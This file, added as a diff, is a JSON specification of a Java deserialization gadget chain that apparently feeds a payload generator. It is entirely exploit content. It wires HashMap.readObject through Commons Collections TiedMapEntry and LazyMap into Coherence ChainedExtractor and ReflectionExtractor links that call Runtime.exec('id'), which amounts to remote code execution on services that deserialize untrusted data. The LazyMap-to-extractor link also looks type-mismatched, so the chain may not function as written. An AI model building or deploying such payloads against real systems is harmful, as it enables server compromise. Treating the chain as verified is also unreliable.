@@ -1,0 +1,53 @@
+{
+  "chain_type": "Cross-library: CC3 TiedMapEntry entry + Coherence ChainedExtractor sink",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject→hash→TiedMapEntry.hashCode→LazyMap.get→ChainedExtractor.extract",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "anything"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ChainedExtractor",
+      "field_overrides": {
+        "m_aExtractor": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"}
+        ]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "getMethod",
+        "m_aoParam": ["getRuntime", []]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "invoke",
+        "m_aoParam": [null, []]
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ReflectionExtractor",
+      "field_overrides": {
+        "m_sMethod": "exec",
+        "m_aoParam": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
